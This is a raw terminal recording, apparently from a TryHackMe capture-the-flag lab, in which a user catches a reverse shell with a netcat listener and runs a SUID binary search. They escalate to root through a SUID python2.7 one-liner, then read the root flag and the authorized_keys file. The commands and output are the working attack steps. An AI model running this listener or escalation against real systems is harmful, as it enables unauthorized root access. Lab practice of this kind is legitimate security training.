@@ -1,0 +1,105 @@
+Script started on 2026-09-16 13:03:52+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="119" LINES="29"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.24.65.71] from (UNKNOWN) [172.24.64.1] 64365
+SOCKET: Shell has connected! PID: 1327
+[K[K^[[201~[?2004h[7mpython3 -c 'import pty; pty.spawn("/bin/bash")'[27m[?2004l[K[?2004hpython3 -c 'import pty; pty.spawn("/bin/bash")'
+[Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [K[?2004hwww-data@ip-10-64-180-55:/var/www/html/uploads$ [7mfind / -user root -perm /4000[27mfind / -user root -perm /4000 2^[K%[K$[K#[K@[K![K*[K&[K&>/dev/null[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfind / -user root -perm /4000 2&>/dev/null
+[K<uploads$ find / -user root -perm /4000 2&>/dev/null
+www-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [K[?2004hwww-data@ip-10-64-180-55:/var/www/html/uploads$ [7mexport TERM=xterm-256color[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexport TERM=xterm-256color
+[Kexport TERM=xterm-256color[Kexport TERM=xterm-256color[Kexport TERM=xterm-256color
+www-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [K[?2004hwww-data@ip-10-64-180-55:/var/www/html/uploads$ [7mfind / -user root -perm /4000 2>/dev/null[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfind / -user root -perm /4000 2>/dev/null
+[Kfind / -user root -perm /4000 2>/dev/null[Kfind / -user root -perm /4000 2>/dev/null[Kfind / -user root -perm /4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/python2.7
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+[K/snap/core/8268/bin/mount[K/snap/core/8268/bin/mount[K/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9665/bin/mount
+/snap/core/9665/bin/ping
+/snap/core/9665/bin/ping6
+/snap/core/9665/bin/su
+/snap/core/9665/bin/umount
+[K/snap/core/9665/usr/bin/chfn
+/snap/core/9665/usr/bin/chsh
+/snap/core/9665/usr/bin/gpasswd
+/snap/core/9665/usr/bin/newgrp
+/snap/core/9665/usr/bin/passwd
+/snap/core/9665/usr/bin/sudo
+/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9665/usr/lib/openssh/ssh-keysign
+/snap/core/9665/usr/lib/snapd/snap-confine
+/snap/core/9665/usr/sbin/pppd
+/snap/core20/2599/usr/bin/chfn
+/snap/core20/2599/usr/bin/chsh
+/snap/core20/2599/usr/bin/gpasswd
+/snap/core20/2599/usr/bin/mount
+/snap/core20/2599/usr/bin/newgrp
+/snap/core20/2599/usr/bin/passwd
+/snap/core20/2599/usr/bin/su
+/snap/core20/2599/usr/bin/sudo
+/snap/core20/2599/usr/bin/umount
+/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2599/usr/lib/openssh/ssh-keysign
+[K/bin/mount
+/bin/su
+/bin/fusermount
+/bin/umount
+www-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [K[K[?2004hwww-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [7mpython2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'[27m[Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [7mpython2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hpython2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+[Kpython2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'[Kpython2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'[Kpython2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+[K]0;root@ip-10-64-180-55: /var/www/html/uploadsroot@ip-10-64-180-55:/var/www/html/uploads# [K]0;root@ip-10-64-180-55: /var/www/html/uploadsroot@ip-10-64-180-55:/var/www/html/uploads# [K[?2004h]0;root@ip-10-64-180-55: /var/www/html/uploadsroot@ip-10-64-180-55:/var/www/html/uploads# cd /root[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /root
+[Kcd /root[Kcd /root[Kcd /root
+]0;root@ip-10-64-180-55: /rootroot@ip-10-64-180-55:/root# [K]0;root@ip-10-64-180-55: /rootroot@ip-10-64-180-55:/root# [K[?2004h]0;root@ip-10-64-180-55: /rootroot@ip-10-64-180-55:/root# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+root.txt  [0m[01;34msnap[0m
+]0;root@ip-10-64-180-55: /rootroot@ip-10-64-180-55:/root# [K]0;root@ip-10-64-180-55: /rootroot@ip-10-64-180-55:/root# [K[?2004h]0;root@ip-10-64-180-55: /rootroot@ip-10-64-180-55:/root# cat root.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat root.txt
+[Kcat root.txt[Kcat root.txt[Kcat root.txt
+THM{pr1v1l3g3_3sc4l4t10n}
+]0;root@ip-10-64-180-55: /rootroot@ip-10-64-180-55:/root# [K]0;root@ip-10-64-180-55: /rootroot@ip-10-64-180-55:/root# [K[?2004h]0;root@ip-10-64-180-55: /rootroot@ip-10-64-180-55:/root# ls -a[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -a
+[Kls -a[Kls -a[Kls -a
+[0m[01;34m.[0m   .bashrc  [01;34m.gnupg[0m  .profile  .viminfo  [01;34msnap[0m
+[01;34m..[0m  [01;34m.cache[0m   [01;34m.local[0m  [01;34m.ssh[0m      root.txt
+]0;root@ip-10-64-180-55: /rootroot@ip-10-64-180-55:/root# [K]0;root@ip-10-64-180-55: /rootroot@ip-10-64-180-55:/root# [K[?2004h]0;root@ip-10-64-180-55: /rootroot@ip-10-64-180-55:/root# cd.[K .ssh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd .ssh
+[Kcd .ssh[Kcd .ssh[Kcd .ssh
+]0;root@ip-10-64-180-55: /root/.sshroot@ip-10-64-180-55:/root/.ssh# [K]0;root@ip-10-64-180-55: /root/.sshroot@ip-10-64-180-55:/root/.ssh# [K[?2004h]0;root@ip-10-64-180-55: /root/.sshroot@ip-10-64-180-55:/root/.ssh# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+authorized_keys
+]0;root@ip-10-64-180-55: /root/.sshroot@ip-10-64-180-55:/root/.ssh# [K]0;root@ip-10-64-180-55: /root/.sshroot@ip-10-64-180-55:/root/.ssh# [K[?2004h]0;root@ip-10-64-180-55: /root/.sshroot@ip-10-64-180-55:/root/.ssh# cat authorized_keys[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat authorized_keys
+[Kcat authorized_keys[Kcat authorized_keys[Kcat authorized_keys
+no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUG9qE7kTCpZUBoEgwBKj/GfO5jXsLHIH/d9Dri+a7hsGpmdivZ6yqG9P2nH/ROKWb6pKqgCkpjGxmIrpM11XOlG89zCwGNE3euVbVc/AI/ZrN6sT4wx2iabrfJW2h006voX+1G7avPQ+I8Z+jv13hHFhrLn10l6m4bkxGzpBq6vmPynh2luXDIyn3wLP0yzSFNwQfG8mHArqLOJJZln4Dy+Z0tQfGOyDSn3Z/GuHvJ9fyvX6OTtm1r2NMYNBvZW5ncEoLUF6yVp5ezUu/WeoddGBFO30hNsLlFMOM6Pfkqvbp8ey3x442CkUuR+JeafShHUmmGcZfdoodWhzjl+99 savagenj
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMLOT6NhiqH5Rp36qJt4jZwfvb/H/+YLRTrx5mS9dSyxumP8+chjxkSNOrdgNtZ6XoaDDDikslQvKMCqoJqHqp4jh9xTQTj29tagUaZmR0gUwatEJPG0SfqNvNExgsTtu2DW3SxCQYwrMtu9S4myr+4x+rwQ739SrPLMdBmughB13uC/3DCsE4aRvWL7p+McehGGkqvyAfhux/9SNgnIKayozWMPhADhpYlAomGnTtd8Cn+O1IlZmvqz5kJDYmnlKppKW2mgtAVeejNXGC7TQRkH6athI5Wzek9PXiFVu6IZsJePo+y8+n2zhOXM2mHx01QyvK2WZuQCvLpWKW92eF amiOpenVPN
+no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDl4BJGtcDq/QvJdaCFhi648IfSPOtepb/1+9jVfZFSDqE4T6Oe3qdy9Mfpu4v9FDLyS5j31INv5N/hZD58VkzXjkgUak[K[A[K[A[Kno-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDl4BJGtcDq/QvJdaCFhi648IfSPOtepb/1+9jVfZFSDqE4T6Oe3qdy9Mfpu4v9FDLyS5j31INv5N/hZD58VkzXjkgUak[K[A[K[A[Kno-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDl4BJGtcDq/QvJdaCFhi648IfSPOtepb/1+9jVfZFSDqE4T6Oe3qdy9Mfpu4v9FDLyS5j31INv5N/hZD58VkzXjkgUaki58fxzrJbY2huaMXDSZXFkK+3fQMrTD1USww9gJrJiJ6T68K5dvfLUR2+e0yHZ8CsJyM3qfHnm/p61uQoQYdjpqQbk8gqGY3aK2S31UccmARGCrZ9Bq1f4XEbfATqlOrEQ5JEV94sfTJ0zURzDZ6USPyvls7OfKdl2rzmUKO50JQxKDD8AW+NuljlDFiWHHO3WEaxuLRS9LowtVji3HGHrZ6U0wFHlkhStwERvnucXXAn6qmbCI3/wf1ld us-east-1-vuln-vms
+]0;root@ip-10-64-180-55: /root/.sshroot@ip-10-64-180-55:/root/.ssh# [K]0;root@ip-10-64-180-55: /root/.sshroot@ip-10-64-180-55:/root/.ssh# [K[?2004h]0;root@ip-10-64-180-55: /root/.sshroot@ip-10-64-180-55:/root/.ssh# exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[Kexit
+www-data@ip-10-64-180-55:/var/www/html/uploads$ [Kwww-data@ip-10-64-180-55:/var/www/html/uploads$ [K[?2004hwww-data@ip-10-64-180-55:/var/www/html/uploads$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit[Kexit[Kexit
+exit
+[K
+[?2004l
+Script done on 2026-09-16 13:09:09+03:00 [COMMAND_EXIT_CODE="1"]
